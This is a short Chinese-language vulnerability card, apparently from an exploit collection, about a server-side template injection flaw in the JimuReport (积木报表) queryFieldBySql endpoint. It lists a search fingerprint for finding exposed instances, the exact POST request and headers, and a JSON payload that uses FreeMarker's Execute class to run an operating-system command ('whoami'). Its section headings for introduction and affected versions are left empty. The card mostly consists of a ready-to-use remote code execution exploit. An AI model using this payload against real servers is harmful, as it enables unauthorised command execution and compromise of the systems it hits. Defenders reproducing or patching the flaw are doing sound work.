# 积木报表queryFieldBySql基于SSTI的任意代码执行漏洞

- **系统**：积木报表queryFieldBySql基于SSTI的任意　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`web.body="积木报表"`
- **请求**：`POST /jmreport/queryFieldBySql HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Type: application/json;charset=UTF-8`　`X-Sign: AD0488642A880C68C8E3551C3BE0F6F5`　`X-TIMESTAMP: 1699726206096`　`X-Access-Token: null`　`token: null`　`JmReport-Tenant-Id: null`　`Content-Length: 128`

**请求体 / payload**
```
{"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"whoami\") }'","dbSource":"","type":"0"}
```

**其他**
- 积木报表queryFieldBySql基于SSTI的任意代码执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 积木报表